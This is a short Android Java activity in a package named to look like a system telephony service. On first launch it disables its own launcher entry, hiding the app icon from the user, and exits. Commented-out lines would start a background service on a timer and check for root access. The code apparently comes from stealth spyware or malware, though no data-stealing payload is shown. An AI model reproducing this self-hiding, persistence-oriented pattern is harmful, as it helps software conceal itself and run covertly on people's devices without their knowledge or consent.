package com.telephony.services;

import android.app.Activity;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;

public class Main extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);

		//Toast.makeText(this, getResources().getString(R.string.cant_run), Toast.LENGTH_SHORT).show();

		// Intent myIntent = new Intent(this, ReglamentService.class);

		// startService(myIntent);

		// Log.d(Utils.LogTag, Utils.CheckRoot()+"");
//		AlarmManager am = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);
//		Intent myIntent = new Intent(this, ReglamentService.class);
//		PendingIntent pmyIntent = PendingIntent.getService(this, 0, myIntent, 0);
//		am.set(AlarmManager.ELAPSED_REALTIME, 50000L, pmyIntent);
		try {
			ComponentName component = new ComponentName(this, Main.class);
			this.getPackageManager().setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
					PackageManager.DONT_KILL_APP);
			Log.d(Utils.LogTag, Main.class.getName() + " disable");
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		finish();
	}

}
